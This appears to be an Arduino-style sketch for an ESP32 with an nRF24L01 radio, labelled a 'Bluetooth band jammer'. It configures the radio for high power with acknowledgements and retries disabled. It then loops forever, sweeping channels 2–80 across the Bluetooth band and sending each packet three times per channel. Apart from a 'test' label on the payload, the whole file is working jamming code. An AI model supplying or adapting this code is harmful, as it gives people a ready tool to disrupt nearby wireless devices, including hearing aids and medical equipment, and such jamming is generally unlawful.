#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>

RF24 radio(5, 17); // CE, CSN pins

const byte address[6] = "00001";

// Bluetooth uses 79 channels from 2402–2480 MHz
// nRF24L01 channel = 2400 + ch MHz
// so Bluetooth maps to channels 2–80
const int BT_CH_START = 2;
const int BT_CH_END   = 80;

struct Payload {
  int id;
  char text[32];
};

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("Starting Bluetooth band jammer...");

  SPI.begin(18, 19, 23, 17); // SCK, MISO, MOSI, SS
 

  if (!radio.begin()) {
    Serial.println("ERROR: Radio hardware not responding!");
    while (1) {}
  }

  Serial.println("Radio OK!");

  if (!radio.isChipConnected()) {
    Serial.println("ERROR: Chip not connected!");
    while (1) {}
  }

  Serial.println("Chip connected!");

  radio.setAutoAck(false);
  radio.openWritingPipe(address);
  radio.stopListening();
  radio.setPALevel(RF24_PA_HIGH);  // max power
  radio.setDataRate(RF24_1MBPS); // occupies more spectrum per channel   
  radio.setRetries(0, 0);

  radio.printDetails();
  Serial.println("Setup complete.");
  Serial.print("Targeting Bluetooth band: ch ");
  Serial.print(BT_CH_START);
  Serial.print(" to ch ");
  Serial.println(BT_CH_END);
}

void loop() {
  Payload p;
  p.id = 1;
  strcpy(p.text, "INTERFERENCE_TEST");

  // hit each channel 3 times before moving on
  for (int ch = BT_CH_START; ch <= BT_CH_END; ch++) {
    radio.setChannel(ch);
    radio.write(&p, sizeof(p));
    radio.write(&p, sizeof(p));
    radio.write(&p, sizeof(p));
  }

  Serial.println("Sweep complete");
}